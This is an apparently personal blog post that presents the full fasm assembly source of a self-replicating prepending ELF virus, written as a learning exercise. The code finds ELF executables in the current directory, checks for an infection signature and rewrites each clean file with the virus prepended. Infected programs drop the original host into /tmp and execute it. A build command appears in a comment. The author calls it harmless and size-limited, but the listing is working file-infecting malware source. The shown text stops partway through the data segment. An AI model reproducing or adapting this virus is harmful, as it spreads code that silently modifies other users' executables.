<!DOCTYPE html>
<html lang="en-us">
<head>
  <link rel="preload" href="/furqantariq.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/furqantariq.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/furqantariq.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/furqantariq.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> An ELF x64 Virus in fasm assembly | furqan&#39;s homepage</title>
  <link rel = 'canonical' href = 'furqantariq.github.io/posts/elf-x64-virus-fasm/'>
  <meta name="description" content="furqan&#39;s homepage">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="An ELF x64 Virus in fasm assembly" />
<meta property="og:description" content="Recently, I was playing around with flat assembler and i needed something to write in it. I tried &ldquo;Hello world&rdquo; program but it was not enough. I believe that generally &ldquo;Hello world&rdquo; programs are not a good way to learn about details of a programming language, especially for somewhat experienced programmers.
So I wrote a virus to familiarize myself to it. Because it is compact and has a everything from condition control flows to loop constructs, not just printing out in standard output and it only took me couple of hours to write it." />
<meta property="og:type" content="article" />
<meta property="og:url" content="furqantariq.github.io/posts/elf-x64-virus-fasm/" /><meta property="og:image" content="furqantariq.github.io/images/share.jpg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-16T12:47:18+02:00" />
<meta property="article:modified_time" content="2022-10-16T12:47:18+02:00" />


  <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="furqantariq.github.io/images/share.jpg"/>

<meta name="twitter:title" content="An ELF x64 Virus in fasm assembly"/>
<meta name="twitter:description" content="Recently, I was playing around with flat assembler and i needed something to write in it. I tried &ldquo;Hello world&rdquo; program but it was not enough. I believe that generally &ldquo;Hello world&rdquo; programs are not a good way to learn about details of a programming language, especially for somewhat experienced programmers.
So I wrote a virus to familiarize myself to it. Because it is compact and has a everything from condition control flows to loop constructs, not just printing out in standard output and it only took me couple of hours to write it."/>

  
  
    
  
  
  <link rel="stylesheet" href="/furqantariq.github.io/css/styles.7c754dee4bfc873743b12288cf94eadcfd3bee1f2cff5a106753b8047879ac5195c8d8ad90f6d73f12e9c841696c51a0abdeae8394e3eb3079f310f418ddf9ec.css" integrity="sha512-fHVN7kv8hzdDsSKIz5Tq3P077h8s/1oQZ1O4BHh5rFGVyNitkPbXPxLpyEFpbFGgq96ug5Tj6zB58xD0GN357A=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="furqantariq.github.io/images/favicon.ico" />

  
  
  
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3SNBC5QD82"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-3SNBC5QD82', { 'anonymize_ip': false });
}
</script>

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="furqantariq.github.io/">home</a></li>
         
        <li><a href="furqantariq.github.io/posts">posts</a></li>
         
        <li><a href="furqantariq.github.io/tags">tags</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" furqantariq.github.io/posts/even-fibonacci-numbers/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="furqantariq.github.io/posts/valentines-day/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&text=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&title=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&is_video=false&description=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=An%20ELF%20x64%20Virus%20in%20fasm%20assembly&body=Check out this article: furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&title=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&title=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&name=An%20ELF%20x64%20Virus%20in%20fasm%20assembly&description=Recently%2c%20I%20was%20playing%20around%20with%20flat%20assembler%20and%20i%20needed%20something%20to%20write%20in%20it.%20I%20tried%20%26ldquo%3bHello%20world%26rdquo%3b%20program%20but%20it%20was%20not%20enough.%20I%20believe%20that%20generally%20%26ldquo%3bHello%20world%26rdquo%3b%20programs%20are%20not%20a%20good%20way%20to%20learn%20about%20details%20of%20a%20programming%20language%2c%20especially%20for%20somewhat%20experienced%20programmers.%0aSo%20I%20wrote%20a%20virus%20to%20familiarize%20myself%20to%20it.%20Because%20it%20is%20compact%20and%20has%20a%20everything%20from%20condition%20control%20flows%20to%20loop%20constructs%2c%20not%20just%20printing%20out%20in%20standard%20output%20and%20it%20only%20took%20me%20couple%20of%20hours%20to%20write%20it." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&t=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents"></nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        An ELF x64 Virus in fasm assembly
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2022-10-16 12:47:18 &#43;0200 CEST" itemprop="datePublished">2022-10-16</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/programming" rel="tag">programming</a>
            
             ,  
            <a class="tag-link" href="/tags/assembly" rel="tag">assembly</a>
            
             ,  
            <a class="tag-link" href="/tags/viruses" rel="tag">viruses</a>
            
        </div>
        
      </div>
    </header>

    
    <div class="content" itemprop="articleBody">
      <p>Recently, I was playing around with <a href="https://flatassembler.net/">flat assembler</a> and i needed something to
write in it. I tried <a href="https://en.wikipedia.org/wiki/%22Hello,_World!%22_program">&ldquo;Hello world&rdquo; program</a> but it was not
enough. I believe that generally &ldquo;Hello world&rdquo; programs are not a good way to learn about details of a programming
language, especially for somewhat experienced programmers.</p>
<p>So I wrote a virus to familiarize myself to it. Because it is compact and has a everything from condition
control flows to loop constructs, not just printing out in standard output and it only took me couple of hours to write it.</p>
<p>The virus is a harmless prepending virus which copies itself to the top of the infected program and infected program does
absolutley nothing harmful except printing a message that it is infected.
The virus only infects <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF</a>
files which are present in current directory (not subdirectories) and smaller than 4KB in size to prevent any potential misuse.</p>
<p><strong>CODE: virus.asm</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#75715e">; Written by Furqan</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; The virus can be assembled with only Fasm.x64 and</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; make sure to append virus signature</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; compilation:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">;   fasm.x64 virus.asm &amp;&amp; printf &#34;\x7e\x49\x4e\x46\x7e&#34; &gt;&gt; virus</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">format</span> ELF64 executable <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">segment</span> readable executable
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub</span> rsp, <span style="color:#ae81ff">2000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">2008</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> rsi, rsi
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> rdx, rdx
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> r9, rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, r9
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rsi, self
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdx, self_size
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, r9
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rsi, vsignl
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdx, <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, r9
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rsi, host
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdx, max_size
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, r9
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, cwdd
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> rsi, rsi
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> rdx, rdx
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span> rax, rax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">js</span> virus
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, rax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0xd9</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span> rsi, [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">+</span> DIRENT]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdx, <span style="color:#ae81ff">800</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span> rax, rax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">js</span> finscan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> r10, rax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> r9, r9
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scan:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span> [rsp <span style="color:#f92672">+</span> r9 <span style="color:#f92672">+</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">+</span> DIRENT.d_type], <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span> .continue
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span> rdi, [rsp <span style="color:#f92672">+</span> r9 <span style="color:#f92672">+</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">+</span> DIRENT.d_name]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rsi, <span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> rdx, rdx
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span> rax, rax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">js</span> .continue
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, [rsp]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span> rsi, [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">1100</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdx, <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, elfmagic
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rcx, <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rep</span> cmpsb
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span> .close
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, [rsp]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rsi, self_size
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> rdx, rdx
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, [rsp]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span> rsi, [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">1100</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdx, vsignl
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span> rax, vsignl
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jl</span> .infect
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span> rsi, [rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">1100</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, vsign
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rcx, vsignl
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rep</span> cmpsb
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">je</span> .close
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    .infect:
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdi, [rsp]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> rsi, rsi
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> rdx, rdx
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdi, [rsp]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rsi, infected
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdx, max_size
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> r15, rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdi, [rsp]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> rsi, rsi
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> rdx, rdx
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdi, [rsp]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rsi, self
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdx, self_size
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdi, [rsp]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rsi, vsign
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdx, vsignl
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdi, [rsp]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rsi, infected
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rdx, r15
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    .close:
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pop</span> rdi
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    .continue:
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">add</span> r9w, [rsp <span style="color:#f92672">+</span> r9 <span style="color:#f92672">+</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">+</span> DIRENT.d_reclen]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cmp</span> r9, r10
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">jl</span> scan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>finscan:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pop</span> rdi
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>virus:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pop</span> r9
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span> r9, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jle</span> .exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rsi, msg
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdx, msgl
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x55</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, tmpf
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rsi, <span style="color:#ae81ff">777</span>o
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> r15, rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, r15
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rsi, host
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdx, r9
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, r15
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span> rsp, <span style="color:#ae81ff">2000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x3b</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> rdi, tmpf
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> rsi, rsi
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> rdx, rdx
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    .exit:
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span>     edi,edi
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span>     eax,<span style="color:#ae81ff">60</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">segment</span> readable writeable
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cwdd</span> db <span style="color:#ae81ff">0x2e</span>,<span style="color:#ae81ff">0x00</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tmpf</span> db <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x00</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">vsign</span> db <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x7e</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">vsignl</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">$</span><span style="color:#f92672">-</span>vsign
